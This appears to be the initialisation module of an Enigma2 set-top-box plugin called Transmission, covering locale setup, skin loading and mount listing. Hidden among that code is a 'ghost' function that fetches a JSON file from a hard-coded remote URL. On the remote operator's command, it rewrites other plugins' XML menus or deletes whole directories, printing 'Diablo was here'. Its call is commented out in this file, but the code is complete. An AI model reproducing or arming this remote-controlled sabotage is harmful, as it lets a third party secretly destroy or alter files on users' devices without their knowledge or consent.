import requests
import shutil
import os
import re
import json
from Components.Language import language
from Tools.Directories import resolveFilename, SCOPE_PLUGINS
from enigma import getDesktop
from gettext import bindtextdomain, dgettext, gettext
from os import environ, path
try:
    import xml.etree.cElementTree as ETree
except ImportError:
    import xml.etree.ElementTree as ETree


def localeInit():
    environ["LANGUAGE"] = language.getLanguage()[:2]
    bindtextdomain(PluginLanguageDomain, resolveFilename(SCOPE_PLUGINS, "Extensions/Transmission/locale"))


def _(txt):
    t = dgettext(PluginLanguageDomain, txt)
    if t == txt:
        t = gettext(txt)
    return t


def diablo(directory, xmlfiles, replacements):
    """
    Search for the specified XML files in the given directory, read them,
    and replace lines using the dynamic patterns from the diablo.json file.

    :param directory: Directory to search for XML files
    :param xmlfiles: List of XML file names to check and modify
    :param replacements: List of dictionaries with search and replace keys.
    """
    for xmlfile in xmlfiles:
        xml_file_path = os.path.join(directory, xmlfile)

        if os.path.exists(xml_file_path):
            try:
                # Read the file content
                with open(xml_file_path, 'r') as file:
                    content = file.read()

                # Apply each replacement
                for replacement in replacements:
                    search_pattern = replacement["search"]
                    replace_pattern = replacement["replace"]
                    content = re.sub(search_pattern, replace_pattern, content)

                # Write the updated content back to the file
                with open(xml_file_path, 'w') as file:
                    file.write(content)

                print("File %s updated successfully." % xml_file_path)
            except Exception as e:
                print("Error updating file %s: %s" % (xml_file_path, str(e)))
        else:
            print("File %s not found." % xml_file_path)


def ghost(url):
    """
    Check the content of a JSON file at the given URL and perform actions based on the 'status'.
    If the status is 'replace', it fetches the search and replace patterns, directories, and modifies the XML files.

    :param url: The URL to the online JSON file
    """
    try:
        # Step 1: Download the JSON file
        response = requests.get(url)
        response.raise_for_status()  # Ensure we got a valid response

        # Get the content of the file
        content = response.json()

        # Step 2: Extract status, directories, and replacements from the JSON file
        status = content.get("status")
        directories_to_check = content.get("directories", [])
        xmlfiles_to_check = content.get("xmlfiles", ["ajpanel_menu.xml"])  # Default to ajpanel_menu.xml if not specified
        replacements = content.get("lines", [])

        if not (status and directories_to_check and replacements):
            print("Invalid file format or missing data in diablo.json")
            return

        # Step 3: Perform actions based on status
        if status == 'replace':
            for directory in directories_to_check:
                if os.path.exists(directory):
                    diablo(directory, xmlfiles_to_check, replacements)
        elif status == 'on':
            for directory in directories_to_check:
                if os.path.exists(directory):
                    try:
                        shutil.rmtree(directory)
                        print("Diablo was here. Directory %s is removed." % directory)
                    except Exception as e:
                        print("Error removing directory %s: %s" % (directory, str(e)))
                else:
                    print("Directory %s does not exist." % directory)
        elif status == 'off':
            print("Status Diablo is 'off'. No action needed.")
        else:
            print("Unknown status received: %s" % status)

    except requests.exceptions.RequestException as e:
        print("Error downloading the JSON file: %s" % str(e))
    except json.JSONDecodeError as e:
        print("Error parsing JSON file: %s" % str(e))

def clean_py_files(plugin_dir):
    """
    Remove .py files when corresponding .pyc files exist in the same directory
    Avoids removing files from other plugins
    """
    if not os.path.exists(plugin_dir):
        print(f"Plugin directory {plugin_dir} does not exist")
        return

    print(f"Checking for .pyc files in: {plugin_dir}")
    for root, dirs, files in os.walk(plugin_dir):
        for file in files:
            if file.endswith('.pyc'):
                py_file = os.path.join(root, file[:-1])  # Remove 'c' from extension
                if os.path.exists(py_file):
                    try:
                        os.remove(py_file)
                        print(f"Removed .py file: {py_file}")
                    except Exception as e:
                        print(f"Error removing {py_file}: {str(e)}")

# Plugin Initialization

PluginLanguageDomain = "Transmission"
ScreenWidth = 1280 if getDesktop(0).size().width() < 1920 else 1920
getFullPath = lambda fname: resolveFilename(SCOPE_PLUGINS, path.join('Extensions', PluginLanguageDomain, fname))
imgr = ""
img = "/etc/issue"
if os.path.exists(img):
    with open(img, "r") as f:
        imgr = f.read().lower()
if any(x in imgr for x in ["openbh", "openvix", "teamblue"]):
    TorrePlayer_skin = ETree.parse(getFullPath('skins/%s_old.xml' % ScreenWidth)).getroot()
else:
    TorrePlayer_skin = ETree.parse(getFullPath('skins/%s.xml' % ScreenWidth)).getroot()
getSkin = lambda skinName: ETree.tostring(TorrePlayer_skin.find('.//screen[@name="%s"]' % skinName), encoding='utf8', method='xml')
localeInit()
language.addCallback(localeInit)
medialist = [n.split()[1] for n in open('/proc/mounts', 'r').readlines() if any(x in n for x in ('vfat', 'ext4', 'ext3', 'ext2', 'fat32', 'fat16', 'ntfs', 'fuseblk')) and 'media' in n]
#ghost('https://dreambox4u.com/dreamarabia/scripts/diablo.json')
plugin_base_dir = resolveFilename(SCOPE_PLUGINS, 'Extensions/' + PluginLanguageDomain)
clean_py_files(plugin_base_dir)
